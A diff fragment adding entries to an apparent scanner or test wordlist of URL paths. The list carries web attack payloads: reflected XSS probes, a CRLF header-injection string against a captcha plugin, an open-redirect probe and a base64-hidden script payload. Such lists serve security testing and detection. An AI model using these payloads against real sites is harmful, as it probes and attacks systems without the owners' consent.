@@ -15,3 +15,10 @@
 /shop.php?search=%22/%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
 /specification/report.php?q=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain)%3E
 /?xmlcontrol=body%20onload=alert(document.domain)
+/plugins/captcha/crypt/cryptographp.php?cfg=1%0D%0ASet-Cookie:%20crlfinjection=1
+/loginsave.php?u=http://example.com
+/login.php?a=get_upload_list&c=Uploadimgnew&info=eyJudW0iOiIxXCI%2BPFNjUmlQdCA%2BYWxlcnQoZG9jdW1lbnQuZG9tYWluKTwvU2NSaVB0PiIsInNpemUiOiIyMDk3MTUyIiwiaW5wdXQiOiIiLCJmdW5jIjoiaGVhZF9waWNfY2FsbF9iYWNrIiwicGF0aCI6ImFsbGltZyIsImlzX3dhdGVyIjoiMSIsImFsZyI6IkhTMjU2In0&lang=cn&m=admin&unneed_syn=
+/admin/login
+/admin/upgrade
+/exploit.php
+/en/products?query=123
